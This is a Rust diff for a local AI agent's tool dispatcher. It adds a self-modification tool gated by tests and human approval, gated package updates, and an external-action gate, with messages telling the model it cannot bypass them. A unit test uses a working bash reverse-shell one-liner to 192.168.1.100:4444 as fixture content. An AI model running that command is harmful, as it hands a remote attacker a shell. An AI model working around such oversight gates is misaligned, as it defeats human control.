@@ -5,12 +5,16 @@
 //! run_shell handles all of those.
 pub mod backup;
 pub mod desktop;
+pub mod eyes;
 pub mod filesystem;
 pub mod learn;
+pub mod pkgupdate;
 pub mod proactive;
 pub mod reminders;
 pub mod safety;
+pub mod select;
 pub mod security;
+pub mod selfpatch;
 pub mod shell;
 pub mod spotify;
 pub mod sysmode;
@@ -21,6 +25,7 @@ pub mod whatsapp;
 use crate::llm::ollama::{ToolCall, ToolDef, ToolFunction};
 use anyhow::{Context, Result};
 use serde_json::json;
+use std::borrow::Cow;
 
 pub fn tool_definitions() -> Vec<ToolDef> {
     vec![
@@ -49,13 +54,29 @@ pub fn tool_definitions() -> Vec<ToolDef> {
             r#type: "function".into(),
             function: ToolFunction {
                 name: "edit_file".into(),
-                description: "Open a file in zeditor for editing. Use for config files, scripts, code.".into(),
+                description: "Edit a code or text file programmatically by replacing target text ('old_str') with new text ('new_str'), or by writing new content. Pass open_in_gui=true to launch GUI editor.".into(),
                 parameters: json!({
                     "type": "object",
                     "properties": {
                         "path": {
                             "type": "string",
                             "description": "Path to the file (~ is expanded automatically)"
+                        },
+                        "old_str": {
+                            "type": "string",
+                            "description": "Existing text or code snippet in the file to replace"
+                        },
+                        "new_str": {
+                            "type": "string",
+                            "description": "New replacement text or code snippet"
+                        },
+                        "content": {
+                            "type": "string",
+                            "description": "Full new content for the file if replacing completely"
+                        },
+                        "open_in_gui": {
+                            "type": "boolean",
+                            "description": "If true, open the file in zeditor GUI for the user"
                         }
                     },
                     "required": ["path"]
@@ -204,12 +225,18 @@ pub fn tool_definitions() -> Vec<ToolDef> {
             r#type: "function".into(),
             function: ToolFunction {
                 name: "write_file".into(),
-                description: "Write content to a file, creating it and parent dirs if needed.".into(),
+                description: "Write code or content to a file, creating the file and any parent directories if needed.".into(),
                 parameters: json!({
                     "type": "object",
                     "properties": {
-                        "path": { "type": "string" },
-                        "content": { "type": "string" }
+                        "path": {
+                            "type": "string",
+                            "description": "Path to the file (~ is expanded automatically)"
+                        },
+                        "content": {
+                            "type": "string",
+                            "description": "The exact content or code to write into the file"
+                        }
                     },
                     "required": ["path", "content"]
                 }),
@@ -265,8 +292,9 @@ pub fn tool_definitions() -> Vec<ToolDef> {
             function: ToolFunction {
                 name: "deny_autokill".into(),
                 description: "Revoke auto-kill permission for a named process (removes it from \
-                              the allowlist). Use when the user says something like 'never kill \
-                              steam' or 'deny auto-kill steam'.".into(),
+                              the allowlist) AND teach Luna it's important: it will never be \
+                              auto-killed or kill-suggested again. Use when the user says \
+                              something like 'never kill steam' or 'deny auto-kill steam'.".into(),
                 parameters: json!({
                     "type": "object",
                     "properties": {
@@ -772,6 +800,144 @@ pub fn tool_definitions() -> Vec<ToolDef> {
         ToolDef {
             r#type: "function".into(),
             function: ToolFunction {
+                name: "self_patch".into(),
+                description: "Propose and install changes to your OWN source code, behind a \
+                              test gate and human approval. The ONLY sanctioned way to modify \
+                              yourself — never use write_file or run_shell to edit your own \
+                              source, that skips the gate. MANDATORY ORDER: (1) action=files to \
+                              see which files really exist — never guess a path; (2) \
+                              action=read to get the file's NUMBERED current text — you may not \
+                              propose an edit to a file you have not read this way; (3) \
+                              action=propose with line_edits:[{\"at_line\":<line number from the \
+                              read output>,\"replace_with\":<the new line>}] — PREFER THIS. \
+                              Referencing a line NUMBER is far more reliable than copying text, \
+                              because copying text back verbatim is where you go wrong: you retype \
+                              it, drop indentation, or turn a two-character escape like backslash-n \
+                              into a real newline. To APPEND to a file, use the LAST line number + \
+                              1. (4) action=validate (runs the full cargo test suite against a \
+                              scratch copy; your real tree is never modified); (5) action=apply — \
+                              ONLY after validation passed AND the user approved. Use \
+                              edits:[{find,replace}] only when a line number cannot express the \
+                              change; each 'find' must appear EXACTLY ONCE. Never use \"content\" \
+                              (whole file): you cannot reproduce a whole source file reliably. \
+                              Also: review, status, rollback, discard. Your constitution, model \
+                              routing, and safety tools are protected. A change only takes effect \
+                              after a rebuild + daemon restart, so ALWAYS say so.".into(),
+                parameters: json!({
+                    "type": "object",
+                    "properties": {
+                        "action": {
+                            "type": "string",
+                            "enum": ["files", "read", "propose", "validate", "review", "status", "apply", "rollback", "discard"],
+                            "description": "files = list the real source files (do this first, never \
+                                           guess a path); read = show a file's exact current text (REQUIRED \
+                                           before proposing an edit to it); propose = stage edits + show \
+                                           diff (nothing applied); validate = run cargo test on a scratch \
+                                           copy; apply = install a validated change (needs user approval); \
+                                           review = show the staged diff; status = current proposal state; \
+                                           rollback = revert the last applied change; discard = drop proposal"
+                        },
+                        "file": {
+                            "type": "string",
+                            "description": "For action=read: the file to read, e.g. src/main.rs"
+                        },
+                        "filter": {
+                            "type": "string",
+                            "description": "For action=files: optional case-insensitive substring to narrow the \
+                                           list (e.g. \"session\", \"patch\", \"log\"). Use it when you know \
+                                           roughly which file you want — a short list is much easier to act on \
+                                           than the full set"
+                        },
+                        "changes": {
+                            "type": "array",
+                            "description": "For action=propose: the files to change. PREFER 'line_edits' \
+                                           (by line number) over 'edits' (exact text) — copying text back \
+                                           verbatim is the single most error-prone thing you can do, and \
+                                           line numbers you already saw in the read output are exact.",
+                            "items": {
+                                "type": "object",
+                                "properties": {
+                                    "file": { "type": "string", "description": "path relative to the source root, e.g. src/tools/eyes.rs" },
+                                    "line_edits": {
+                                        "type": "array",
+                                        "description": "Replace a whole line by its number. RECOMMENDED. 'at_line' \
+                                                       is 1-based and must be a line number shown in the read output. \
+                                                       To APPEND to the end of the file, use the LAST line number + 1. \
+                                                       'replace_with' is the complete new line(s) — include the original \
+                                                       indentation.",
+                                        "items": {
+                                            "type": "object",
+                                            "properties": {
+                                                "at_line": { "type": "integer", "description": "1-based line number from the read output; last_line+1 appends" },
+                                                "replace_with": { "type": "string", "description": "the full replacement text for that line" }
+                                            },
+                                            "required": ["at_line", "replace_with"]
+                                        }
+                                    },
+                                    "edits": {
+                                        "type": "array",
+                                        "description": "Targeted replacements by exact text. Use only when a line \
+                                                       number cannot express the change. Each 'find' must appear \
+                                                       EXACTLY ONCE in the file.",
+                                        "items": {
+                                            "type": "object",
+                                            "properties": {
+                                                "find": { "type": "string", "description": "the exact current text to replace, copied verbatim from the file" },
+                                                "replace": { "type": "string", "description": "the new text" }
+                                            },
+                                            "required": ["find", "replace"]
+                                        }
+                                    },
+                                    "content": { "type": "string", "description": "full file content — only for small files" }
+                                },
+                                "required": ["file"]
+                            }
+                        },
+                        "reason": {
+                            "type": "string",
+                            "description": "For action=propose: one line on why this change is needed."
+                        }
+                    },
+                    "required": ["action"]
+                }),
+            },
+        },
+
+        ToolDef {
+            r#type: "function".into(),
+            function: ToolFunction {
+                name: "system_update".into(),
+                description: "Guarded Arch package updates. action=check (default) lists pending \
+                              updates WITHOUT changing anything (uses checkupdates against a throwaway \
+                              temp DB) and classifies each as routine or breaking (major version bump). \
+                              action=apply performs a FULL sync upgrade (yay/pacman -Syu, AUR rebuilt) \
+                              but ONLY if the human has opened the gate by setting [updates] \
+                              allow_apply = true in ~/.config/luna/luna.toml. That gate is a human \
+                              decision: you cannot open it, and there is no argument that will. If \
+                              apply refuses, tell the user exactly what to change and stop — do NOT \
+                              retry, do NOT try to install anything yourself, and do NOT run a bare \
+                              'pacman -Syu' via run_shell (that is a partial upgrade and can break \
+                              AUR packages). Use for 'are there updates', 'update my system', \
+                              'check for pacman updates'.".into(),
+                parameters: json!({
+                    "type": "object",
+                    "properties": {
+                        "action": {
+                            "type": "string",
+                            "enum": ["check", "apply"],
+                            "description": "check (default) = list + classify pending updates, change nothing; \
+                                           apply = attempt the full-sync upgrade (will refuse unless the \
+                                           human has opened [updates] allow_apply in luna.toml)"
+                        }
+                    },
+                    "required": ["action"]
+                }),
+            },
+        },
+
+        ToolDef {
+            r#type: "function".into(),
+            function: ToolFunction {
                 name: "sysmode".into(),
                 description: "Luna's interface to the 'sysmode' hardening-profile switcher \
                               (normally installed at /usr/local/bin/sysmode). Actions: \
@@ -873,6 +1039,32 @@ pub fn tool_definitions() -> Vec<ToolDef> {
         ToolDef {
             r#type: "function".into(),
             function: ToolFunction {
+                name: "see".into(),
+                description: "Look at the screen and describe what is there using a local \
+                              vision model. target='screen' captures the whole desktop with \
+                              grim; target='browser' captures the automation Chromium's \
+                              current page. Returns a plain-language description (visible \
+                              text, windows, page content). Use when the user asks what is \
+                              on the screen, to check what a web page actually looks like, \
+                              or to read visible text off the display. Loads a small vision \
+                              model on demand — planning pauses briefly while it runs.".into(),
+                parameters: json!({
+                    "type": "object",
+                    "properties": {
+                        "target": {
+                            "type": "string",
+                            "enum": ["screen", "browser"],
+                            "description": "'screen' = whole desktop, 'browser' = the browser page"
+                        }
+                    },
+                    "required": ["target"]
+                }),
+            },
+        },
+
+        ToolDef {
+            r#type: "function".into(),
+            function: ToolFunction {
                 name: "whatsapp_send".into(),
                 description: "Interact with the user's own WhatsApp via the local bridge (linked \
                               once via 'luna --whatsapp-link'). SEND-ONLY: it cannot read incoming \
@@ -957,6 +1149,7 @@ pub fn fast_tool_definitions() -> Vec<ToolDef> {
         "list_reminders",
         "cancel_reminder",
         "dns_lookup",
+        "see",
     ];
     tool_definitions()
         .into_iter()
@@ -964,17 +1157,207 @@ pub fn fast_tool_definitions() -> Vec<ToolDef> {
         .collect()
 }
 
+/// Keys under which models nest the real argument object inside a wrapper.
+const ENVELOPE_PAYLOAD_KEYS: &[&str] =
+    &["arguments", "args", "parameters", "params", "input", "kwargs"];
+
+/// Keys under which models repeat the tool name inside a wrapper.
+const ENVELOPE_NAME_KEYS: &[&str] =
+    &["name", "tool", "function", "tool_name", "toolName", "tool_call"];
+
+/// Unwrap the argument envelope, if there is one.
+///
+/// Measured 2026-10-01 on the security tier: the same model, the same request,
+/// produced all three of these shapes across a handful of turns —
+///
+///   {"path": "/tmp/x.sh", "content": "…"}                    ← the only shape
+///   {"function": "write_file", "arguments": {"path": …}}      ← previously ignored
+///   {"name": "write_file", "arguments": {"path": …}}          ← previously ignored
+///
+/// and the wrapped forms were reported as *missing arguments*. The log line for
+/// the second shape is unambiguous: it carried `"path":"/tmp/reverse_shell.sh"`
+/// and still failed with "write_file was called with no path", because the path
+/// was one level down where the arm could not see it. Five identical failures in
+/// a row on a request that was, in fact, fully specified.
+///
+/// Done here, at the single dispatch chokepoint, rather than in each arm, so
+/// that the fix cannot be forgotten by a tool added later. That matters: the
+/// wrong-envelope bug is invisible at the call site and identical in symptom to
+/// a model that simply left an argument out, which is the one case where failing
+/// loudly is correct.
+///
+/// Conservative on purpose, because a tool call is executed. To unwrap, all of
+/// the following must hold:
+///   - the wrapper names a tool that is actually registered, and
+///   - the wrapper carries *only* wrapper keys — a payload key plus a name key —
+///     so a genuine argument set that happens to include `name` (`allow_autokill`,
+///     `use_skill`, `create_skill`) can never be unwrapped by mistake, and
+///   - the payload is a non-empty object, or a string that parses as one.
+///
+/// A wrapper that fails any of these is passed through untouched, and the arm
+/// reports what it is actually missing.
+pub fn normalise_tool_args<'a>(args: &'a serde_json::Value) -> Cow<'a, serde_json::Value> {
+    let Some(obj) = args.as_object() else {
+        return Cow::Borrowed(args);
+    };
+
+    // Every key must be a wrapper key. `write_file` has `path`/`content`, so a
+    // real argument set almost never qualifies; that asymmetry is the guard.
+    if obj
+        .keys()
+        .any(|k| !ENVELOPE_PAYLOAD_KEYS.contains(&k.as_str()) && !ENVELOPE_NAME_KEYS.contains(&k.as_str()))
+    {
+        return Cow::Borrowed(args);
+    }
+
+    // The named tool must exist. Without this, any `{"name": "x", "input": …}`
+    // would be unwrapped, and a wrapper naming a tool that does not exist is a
+    // malformed call we want to see as-is.
+    let names_a_tool = ENVELOPE_NAME_KEYS.iter().any(|k| {
+        obj.get(*k)
+            .and_then(|v| v.as_str())
+            .map(|n| is_registered_tool(n))
+            .unwrap_or(false)
+    });
+    if !names_a_tool {
+        return Cow::Borrowed(args);
+    }
+
+    for key in ENVELOPE_PAYLOAD_KEYS {
+        match obj.get(*key) {
+            // The normal wrapped form.
+            Some(inner) if inner.is_object() && !inner.as_object().is_some_and(|o| o.is_empty()) => {
+                let named = ENVELOPE_NAME_KEYS
+                    .iter()
+                    .find(|k| obj.contains_key(**k))
+                    .and_then(|k| obj.get(*k))
+                    .and_then(|v| v.as_str())
+                    .unwrap_or("?");
+                tracing::debug!(
+                    "Unwrapped tool arguments nested under '{}' for {}",
+                    key,
+                    named
+                );
+                return Cow::Borrowed(inner);
+            }
+            // Double-wrapped: the payload is itself a JSON *string*. Models that
+            // serialise their own arguments as text do this. Parsed rather than
+            // passed through, because the outer object is already known to be a
+            // wrapper, so the string is the argument set by elimination.
+            Some(inner) if inner.is_string() => {
+                if let Some(s) = inner.as_str() {
+                    // Strict first, then the raw-newline repair: a serialised
+                    // file body carries literal newlines inside the JSON string,
+                    // which is invalid JSON and fails to parse outright.
+                    let parsed = serde_json::from_str::<serde_json::Value>(s)
+                        .ok()
+                        .or_else(|| {
+                            serde_json::from_str::<serde_json::Value>(
+                                &crate::llm::react::escape_raw_newlines_in_strings(s),
+                            )
+                            .ok()
+                        });
+                    if let Some(p) = parsed {
+                        if p.is_object() && !p.as_object().is_some_and(|o| o.is_empty()) {
+                            return Cow::Owned(p);
+                        }
+                    }
+                }
+            }
+            _ => {}
+        }
+    }
+
+    Cow::Borrowed(args)
+}
+
+/// Is `name` a registered tool?
+fn is_registered_tool(name: &str) -> bool {
+    tool_definitions()
+        .iter()
+        .any(|t| t.function.name == name)
+}
+
 pub async fn execute(tool_call: &ToolCall, config: &crate::config::LunaConfig) -> Result<String> {
     let name = &tool_call.function.name;
-    let args = &tool_call.function.arguments;
+
+    // Normalise the argument envelope ONCE, here, before any arm sees it.
+    //
+    // Measured 2026-10-01: this model emits the arguments in three different
+    // envelopes depending on the draw, and only one of them was understood:
+    //
+    //   {"path": "...", "content": "..."}                     ← understood
+    //   {"function": "write_file", "arguments": {"path": …}}   ← ignored
+    //   {"name": "write_file", "arguments": {...}}             ← ignored
+    //
+    // The wrapped forms looked like a missing argument: five consecutive
+    // write_file calls, each carrying a perfectly good path nested one level
+    // down, each reported as "write_file was called with no path". Doing this at
+    // the chokepoint means no arm has to defend against it, and a future tool
+    // cannot forget to.
+    let args = &normalise_tool_args(&tool_call.function.arguments);
 
     tracing::info!("Executing tool: {} with args: {}", name, args);
+
+    // ── Human gate on real-world actions ────────────────────────────────────
+    // Placed here, at the single dispatch chokepoint, so no individual tool arm
+    // can forget it and no argument can talk its way past it. Deliberately
+    // BEFORE any argument parsing: a gated tool must not so much as look at its
+    // arguments, let alone act on them.
+    if !config.external.allow_external_actions && config.external.is_gated(name) {
+        tracing::warn!(
+            "Refused '{}': external-action gate is closed (args were not acted on)",
+            name
+        );
+        let alts = config.external.read_only_alternatives(name);
+        let alt_line = if alts.is_empty() {
+            String::new()
+        } else {
+            format!(
+                "Read-only alternative{} that still work{}: {}.",
+                if alts.len() == 1 { "" } else { "s" },
+                if alts.len() == 1 { "s" } else { "" },
+                alts.join(", ")
+            )
+        };
+        anyhow::bail!(
+            "Refused '{}': the human gate for actions that leave this machine is closed.\n\
+             This tool sends, closes, posts, or clicks something outside Luna. In the wild a \
+             derailed turn used it to close three of the user's real tasks with nobody asking, \
+             and a later one created two duplicate tasks when asked only to LIST them. Nothing \
+             was changed by this refusal.\n\
+             {}\n\
+             To let her use it, the USER must set [external] allow_external_actions = true in \
+             ~/.config/luna/luna.toml and restart the daemon. You cannot pass an argument to \
+             open this, and you must not try to work around it with run_shell.",
+            name,
+            alt_line
+        );
+    }
 
     let sudo_pass = config.agent.sudo_password.as_deref();
 
     match name.as_str() {
         "run_shell" => {
-            let command = args["command"].as_str().unwrap_or("echo 'no command'");
+            // A missing `command` is a malformed call, not an empty command.
+            //
+            // It used to fall back to `echo 'no command'`, which returned the
+            // literal string "SUCCESS no command". That reads as a successful
+            // result, so the model believed it had run something, had nothing
+            // to report, and called again — burning the iteration budget until
+            // the ReAct loop gave up and `synthesize_answer` printed
+            // "Here's what I found:\n\nSUCCESS no command" as its final answer.
+            // Measured 5/6 exploit-authoring turns ended that way: the file was
+            // written correctly and then Luna answered with a dump of this.
+            //
+            // Say what actually happened and tell the model to answer instead.
+            let Some(command) = args["command"].as_str().filter(|c| !c.trim().is_empty())
+            else {
+                return Ok("ERROR: run_shell was called with no command. Nothing was \
+                    executed. If the task is already complete, reply to the user in \
+                    plain text now — do not call another tool."
+                    .to_string());
+            };
             let result = shell::run_command(command, sudo_pass).await?;
             if result.exit_code == 0 {
                 Ok(format!("SUCCESS\n{}", result.stdout.trim()))
@@ -1043,8 +1426,20 @@ pub async fn execute(tool_call: &ToolCall, config: &crate::config::LunaConfig) -
         "edit_file" => {
             let path = args["path"].as_str().unwrap_or("");
             let expanded = path.replace('~', &std::env::var("HOME").unwrap_or_default());
-            shell::run_command(&format!("zeditor {} &", expanded), sudo_pass).await?;
-            Ok("done".to_string())
+            let open_in_gui = args["open_in_gui"].as_bool().unwrap_or(false);
+            let old_str = args["old_str"].as_str();
+            let new_str = args["new_str"].as_str();
+            let content = args["content"].as_str();
+
+            if open_in_gui || (old_str.is_none() && new_str.is_none() && content.is_none()) {
+                shell::run_command(&format!("zeditor {} &", expanded), sudo_pass).await?;
+                Ok("Opened in editor".to_string())
+            } else {
+                if let Some(reason) = selfpatch::blocks_raw_write(&config.selfpatch, &expanded) {
+                    return Err(anyhow::anyhow!(reason));
+                }
+                filesystem::edit_file(&expanded, old_str, new_str, content).await
+            }
         }
 
         "web_search" => {
@@ -1058,15 +1453,38 @@ pub async fn execute(tool_call: &ToolCall, config: &crate::config::LunaConfig) -
         }
 
         "read_file" => {
-            let path = args["path"].as_str().unwrap_or("/dev/null");
+            // Same defect as write_file/run_shell: a missing `path` used to
+            // read /dev/null, which is empty, so the model received "" and
+            // concluded the file did not exist.
+            let Some(path) = args["path"].as_str().filter(|p| !p.trim().is_empty()) else {
+                return Err(anyhow::anyhow!(
+                    "read_file was called with no path. Re-issue with an explicit `path`."
+                ));
+            };
             let expanded = path.replace('~', &std::env::var("HOME").unwrap_or_default());
             filesystem::read_file(&expanded).await
         }
 
         "write_file" => {
-            let path = args["path"].as_str().unwrap_or("/dev/null");
+            // Same class of bug as run_shell above: a missing `path` used to
+            // default to "/dev/null", the write was discarded, and the tool
+            // still returned "Written to /dev/null". That is a fabricated
+            // success — the exact failure this tier's tool-discipline rule
+            // exists to prevent. Observed once in six exploit-authoring turns,
+            // where the model omitted `path` and Luna cheerfully reported
+            // writing to /dev/null instead of the requested file.
+            let Some(path) = args["path"].as_str().filter(|p| !p.trim().is_empty()) else {
+                return Err(anyhow::anyhow!(
+                    "write_file was called with no path. Nothing was written. \
+                     Re-issue the call with an explicit `path` argument."
+                ));
+            };
             let content = args["content"].as_str().unwrap_or("");
             let expanded = path.replace('~', &std::env::var("HOME").unwrap_or_default());
+            // Her own source must go through the self_patch gate, not a raw write.
+            if let Some(reason) = selfpatch::blocks_raw_write(&config.selfpatch, &expanded) {
+                return Err(anyhow::anyhow!(reason));
+            }
             filesystem::write_file(&expanded, content).await?;
             Ok(format!("Written to {}", expanded))
         }
@@ -1277,7 +1695,9 @@ pub async fn execute(tool_call: &ToolCall, config: &crate::config::LunaConfig) -
                             .filter(|d| d.as_str() > cutoff.as_str())
                             .count()
                     };
-                    let status = if protected.iter().any(|p| p == name) {
+                    let status = if tracker.is_important(name) {
+                        "important (learned)"
+                    } else if protected.iter().any(|p| p == name) {
                         "protected"
                     } else if allowlist.contains(name) {
                         "auto-kill allowed"
@@ -1285,8 +1705,8 @@ pub async fn execute(tool_call: &ToolCall, config: &crate::config::LunaConfig) -
                         "-"
                     };
                     format!(
-                        "{:<24} {}/14d  idle {} cyc  {:>6} jiffies  {}",
-                        name, days_14, s.idle_cycles, s.total_jiffies, status
+                        "{:<24} {}/14d  active {} cyc  idle {} cyc  {:>6} jiffies  {}",
+                        name, days_14, s.active_cycles, s.idle_cycles, s.total_jiffies, status
                     )
                 })
                 .collect();
@@ -1298,6 +1718,14 @@ pub async fn execute(tool_call: &ToolCall, config: &crate::config::LunaConfig) -
                 config.daemon.check_interval_mins,
                 rows.join("\n")
             ))
+        }
+
+        "see" => {
+            let target = args["target"].as_str().unwrap_or("screen");
+            match target {
+                "browser" => crate::tools::eyes::see_browser(config).await,
+                _ => crate::tools::eyes::see_screen(config).await,
+            }
         }
 
         "allow_autokill" => {
@@ -1319,16 +1747,15 @@ pub async fn execute(tool_call: &ToolCall, config: &crate::config::LunaConfig) -
             if name.is_empty() {
                 anyhow::bail!("No process name provided");
             }
-            match crate::daemon::tracker::allowlist_remove(name)? {
-                true => Ok(format!(
-                    "Revoked — '{}' will never be auto-killed again.",
-                    name
-                )),
-                false => Ok(format!(
-                    "'{}' wasn't on the auto-kill list — it was already safe.",
-                    name
-                )),
-            }
+            crate::daemon::tracker::allowlist_remove(name)?;
+            // Teach the learner: this app matters to the user, keep it safe.
+            crate::daemon::tracker::persist_keep(name)?;
+            tracing::info!("Learned to keep '{}' — never auto-kill or suggest it again", name);
+            Ok(format!(
+                "Understood — '{}' is marked as important. It won't be auto-killed or \
+                 kill-suggested again.",
+                name
+            ))
         }
 
         "set_reminder" => {
@@ -1500,6 +1927,116 @@ echo "STATUS=$STATUS"
             ))
         }
 
+        "self_patch" => {
+            let action = args["action"].as_str().unwrap_or("status");
+            let sp = &config.selfpatch;
+            match action {
+                "propose" => {
+                    // Accept several shapes, because a 7B mixes them up:
+                    //   changes: [{file, line_edits:[{at_line, replace_with}]}]  <- most reliable
+                    //   changes: [{file, edits:[{find, replace}]}]                <- exact text
+                    //   changes: [{file, content: "<full file>"}]                 <- small files
+                    //   flat {file, content}                                      <- fallback
+                    fn spec(c: &serde_json::Value) -> Option<selfpatch::ChangeSpec> {
+                        let f = c["file"].as_str()?;
+                        let content = c["content"].as_str().map(|s| s.to_string());
+                        let mut edits: Vec<(String, String)> = Vec::new();
+                        if let Some(arr) = c["edits"].as_array() {
+                            for e in arr {
+                                if let (Some(a), Some(b)) =
+                                    (e["find"].as_str(), e["replace"].as_str())
+                                {
+                                    edits.push((a.to_string(), b.to_string()));
+                                }
+                            }
+                        }
+                        // Line-anchored shape. Also read `at_line`/`replace_with`
+                        // from inside `edits` — a 7B often puts the line anchor
+                        // in the edits array rather than a separate one.
+                        let mut line_edits: Vec<(usize, String)> = Vec::new();
+                        for key in ["line_edits", "edits"] {
+                            if let Some(arr) = c[key].as_array() {
+                                for e in arr {
+                                    let line = e["at_line"]
+                                        .as_u64()
+                                        .or_else(|| e["line"].as_u64());
+                                    let rep = e["replace_with"]
+                                        .as_str()
+                                        .or_else(|| e["replace"].as_str());
+                                    if let (Some(l), Some(r)) = (line, rep) {
+                                        line_edits.push((l as usize, r.to_string()));
+                                    }
+                                }
+                            }
+                        }
+                        Some(selfpatch::ChangeSpec {
+                            file: f.to_string(),
+                            content,
+                            edits,
+                            line_edits,
+                        })
+                    }
+                    let mut changes: Vec<selfpatch::ChangeSpec> = Vec::new();
+                    if let Some(arr) = args["changes"].as_array() {
+                        changes.extend(arr.iter().filter_map(spec));
+                    }
+                    if changes.is_empty() && args["file"].is_string() {
+                        changes.extend(spec(&args.clone()));
+                    }
+                    if changes.is_empty() {
+                        anyhow::bail!(
+                            "self_patch propose needs a 'changes' array. Most reliable shape:\n\
+                             {{\"action\":\"propose\",\"changes\":[{{\"file\":\"src/tools/x.rs\",\
+                             \"line_edits\":[{{\"at_line\":42,\"replace_with\":\"<the new line>\"}}]}}],\
+                             \"reason\":\"why\"}}\n\
+                             'at_line' is 1-based and must be a line number you saw in the read \
+                             output; use the last line number + 1 to APPEND. Copying exact text is \
+                             error-prone, so prefer at_line over find/replace."
+                        );
+                    }
+                    let reason = args["reason"].as_str().unwrap_or("");
+                    Ok(selfpatch::propose(sp, &changes, reason).await?)
+                }
+                "validate" => Ok(selfpatch::validate(sp).await?),
+                "review" => selfpatch::review(sp),
+                "apply" => selfpatch::apply(sp),
+                "rollback" => selfpatch::rollback(sp),
+                "discard" => selfpatch::discard(),
+                "files" => {
+                    let root = std::path::PathBuf::from(&sp.source_dir);
+                    if !sp.enabled {
+                        anyhow::bail!("self-modification is disabled in config");
+                    }
+                    let filter = args["filter"].as_str().unwrap_or("");
+                    Ok(selfpatch::list_source_files(&root, filter))
+                }
+                "read" => {
+                    let f = args["file"].as_str().unwrap_or("");
+                    let root = std::path::PathBuf::from(&sp.source_dir);
+                    if !sp.enabled {
+                        anyhow::bail!("self-modification is disabled in config");
+                    }
+                    selfpatch::read_file(&root, f)
+                }
+                _ => Ok(selfpatch::status(sp)),
+            }
+        }
+
+        "system_update" => {
+            let action = args["action"].as_str().unwrap_or("check");
+            match action {
+                "apply" => {
+                    // The gate is config, not an argument. She cannot pass it.
+                    Ok(crate::tools::pkgupdate::apply(
+                        sudo_pass,
+                        config.updates.allow_apply,
+                    )
+                    .await?)
+                }
+                _ => Ok(crate::tools::pkgupdate::check().await?),
+            }
+        }
+
         "run_safety_check" => {
             let action = args["action"].as_str().unwrap_or("status");
             match action {
@@ -1589,9 +2126,24 @@ echo "STATUS=$STATUS"
                         Ok(out) => Ok(out),
                         Err(e) => Ok(format!("Couldn't re-apply the sysmode profile: {e:#}")),
                     },
+                    "verify" => match crate::tools::sysmode::verify(scfg).await {
+                        Ok(out) => Ok(out),
+                        Err(e) => Ok(format!("Couldn't run sysmode verify: {e:#}")),
+                    },
+                    "doctor" => match crate::tools::sysmode::doctor(scfg).await {
+                        Ok(out) => Ok(out),
+                        Err(e) => Ok(format!("Couldn't run sysmode doctor: {e:#}")),
+                    },
+                    "dossier" => {
+                        let ip = args.get("ip").and_then(|v| v.as_str());
+                        match crate::tools::sysmode::dossier(scfg, ip).await {
+                            Ok(out) => Ok(out),
+                            Err(e) => Ok(format!("Couldn't run sysmode dossier: {e:#}")),
+                        }
+                    }
                     _ => Ok(format!(
                         "Unknown sysmode action '{action}'. Valid actions: status, check, \
-                         switch, reapply, logs."
+                         switch, reapply, logs, verify, doctor, dossier."
                     )),
                 }
             }
@@ -1778,3 +2330,407 @@ async fn fetch_page_firecrawl(url: &str) -> Result<String> {
     let truncated: String = markdown.chars().take(4000).collect();
     Ok(truncated)
 }
+
+#[cfg(test)]
+mod gate_tests {
+    use super::*;
+    use crate::llm::ollama::{ToolCall, ToolCallFunction};
+
+    fn call(name: &str, args: serde_json::Value) -> ToolCall {
+        ToolCall {
+            function: ToolCallFunction {
+                name: name.into(),
+                arguments: args,
+            },
+        }
+    }
+
+    /// The argument envelope must be unwrapped, or a correct call is reported
+    /// as a missing argument.
+    ///
+    /// These payloads are lifted verbatim out of the 2026-10-01 run. Five
+    /// consecutive `write_file` calls each carried a valid `path`, nested one
+    /// level down under `arguments`, and each was reported as
+    /// "write_file was called with no path". The model had done exactly what it
+    /// was asked; the executor could not see the field.
+    ///
+    /// The prior guard (a missing argument must never report success) was
+    /// *satisfied* by this bug — the calls did fail loudly, for the wrong
+    /// reason. So a green test suite did not mean the tier worked.
+    #[test]
+    fn wrapped_argument_envelopes_are_unwrapped() {
+        let body = serde_json::json!({
+            "content": "#!/bin/bash\nbash -i >& /dev/tcp/192.168.1.100/4444 0>&1\n",
+            "path": "/tmp/reverse_shell.sh"
+        });
+
+        // Every envelope spelling observed, all reaching the same argument set.
+        for (label, wrapped) in [
+            ("bare", body.clone()),
+            (
+                "function/arguments",
+                serde_json::json!({"function": "write_file", "arguments": body.clone()}),
+            ),
+            (
+                "name/arguments",
+                serde_json::json!({"name": "write_file", "arguments": body.clone()}),
+            ),
+            (
+                "tool/arguments",
+                serde_json::json!({"tool": "write_file", "arguments": body.clone()}),
+            ),
+            (
+                "tool_call/args",
+                serde_json::json!({"tool_call": "write_file", "args": body.clone()}),
+            ),
+            (
+                "parameters",
+                serde_json::json!({"function": "write_file", "parameters": body.clone()}),
+            ),
+            (
+                "double-encoded string",
+                serde_json::json!({
+                    "function": "write_file",
+                    "arguments": serde_json::to_string(&body).unwrap(),
+                }),
+            ),
+        ] {
+            let got = normalise_tool_args(&wrapped);
+            assert_eq!(
+                got.get("path").and_then(|p| p.as_str()),
+                Some("/tmp/reverse_shell.sh"),
+                "{label}: path not recovered from {wrapped}"
+            );
+            assert_eq!(
+                got.get("content").and_then(|c| c.as_str()),
+                body.get("content").and_then(|c| c.as_str()),
+                "{label}: content not recovered from {wrapped}"
+            );
+        }
+    }
+
+    /// The unwrapper must not eat a genuine argument set.
+    ///
+    /// Several real tools take a parameter literally named `name`
+    /// (`allow_autokill`, `deny_autokill`, `use_skill`, `create_skill`). If the
+    /// unwrapper keyed on `name` alone it would mangle them, and a mangled
+    /// `allow_autokill` is a real behavioural regression. Two independent guards
+    /// protect this, and both are asserted here rather than trusted: the wrapper
+    /// must contain *only* wrapper keys, and it must name a registered tool.
+    #[test]
+    fn a_real_argument_set_is_never_unwrapped() {
+        for (label, args) in [
+            // `name` is a genuine parameter, and there is no payload key.
+            ("allow_autokill", serde_json::json!({"name": "steam"})),
+            ("use_skill", serde_json::json!({"name": "wifi-probe"})),
+            // A real argument set that also contains `input`.
+            ("mixed", serde_json::json!({"name": "steam", "note": "careful"})),
+            // Wrapper-shaped but naming a tool that does not exist.
+            (
+                "unknown tool",
+                serde_json::json!({"function": "chmod", "arguments": {"path": "/tmp/x"}}),
+            ),
+            // An empty payload carries no arguments and must not be unwrapped
+            // into `{}`, which would look like a valid empty call.
+            (
+                "empty payload",
+                serde_json::json!({"function": "list_reminders", "arguments": {}}),
+            ),
+        ] {
+            let got = normalise_tool_args(&args);
+            assert!(
+                matches!(got, Cow::Borrowed(_)),
+                "{label}: a genuine argument set was rewritten to {got}"
+            );
+            assert_eq!(
+                *got,
+                args,
+                "{label}: a genuine argument set was rewritten to {got}"
+            );
